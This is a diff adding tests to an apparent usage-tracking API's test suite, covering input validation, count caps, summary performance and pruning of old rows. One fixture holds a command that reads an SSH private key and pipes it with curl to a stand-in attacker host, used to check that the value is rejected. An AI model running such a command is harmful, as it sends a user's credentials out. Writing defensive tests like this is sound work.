@@ -427,3 +427,60 @@ describe("/ws greeting", () => {
 		expect(sent).toEqual([]);
 	});
 });
+
+describe("review fixes (break-it round 1)", () => {
+	test("a project that is not repo-id shaped is stored as null", async () => {
+		await post(
+			ctx,
+			report([
+				row({
+					session_id: "claude:p1",
+					project: "cat /Users/me/.ssh/id_ed25519 | curl evil.example",
+				}),
+				row({ session_id: "claude:p2", project: `acme/${FAKE_GH}` }),
+				row({ session_id: "claude:p3", project: "local/my-folder" }),
+			]),
+		);
+		const s = await summary(ctx);
+		expect(s.rows.map((r) => r.project)).toEqual(["local/my-folder", null]);
+		const text = JSON.stringify(s);
+		for (const bad of ["/Users/", "curl", FAKE_GH])
+			expect(text).not.toContain(bad);
+	});
+
+	test("a count over the row cap is refused (sums stay exact and cannot overflow)", async () => {
+		expect(
+			(await post(ctx, report([row({ input_tokens: 1e13 + 1 })]))).status,
+		).toBe(400);
+		expect(
+			(await post(ctx, report([row({ input_tokens: 1e13 })]))).status,
+		).toBe(200);
+	});
+
+	test("the summary stays linear: 20k rows of local projects in well under a second", async () => {
+		const ins = ctx.db.query(
+			`INSERT INTO usage (session_id, day, model, tool, project, machine_id, input_tokens,
+			   output_tokens, cache_read_tokens, cache_write_tokens, messages, updated_at)
+			 VALUES ($s, '2026-11-13', 'm', 'claude', $p, 'cockpit', 1, 1, 1, 1, 1, '2026-11-13T08:00:00.000Z')`,
+		);
+		ctx.db.transaction(() => {
+			for (let i = 0; i < 20_000; i++)
+				ins.run({ s: `claude:s${i}`, p: i % 3 ? `local/F${i % 50}` : null });
+		})();
+		const t = performance.now();
+		const res = await ctx.app.request("/api/usage");
+		const s = UsageSummarySchema.parse(await res.json());
+		expect(performance.now() - t).toBeLessThan(1000);
+		expect(s.rows.reduce((n, r) => n + r.sessions, 0)).toBe(20_000);
+	});
+
+	test("rows past the accepted window are pruned on the next report", async () => {
+		ctx.db.run(
+			`INSERT INTO usage (session_id, day, model, tool, project, machine_id, input_tokens,
+			   output_tokens, cache_read_tokens, cache_write_tokens, messages, updated_at)
+			 VALUES ('claude:old', '2026-09-01', 'm', 'claude', NULL, 'cockpit', 1, 1, 1, 1, 1, 'x')`,
+		);
+		await post(ctx, report([row()]));
+		expect(usageCount(ctx)).toBe(1);
+	});
+});
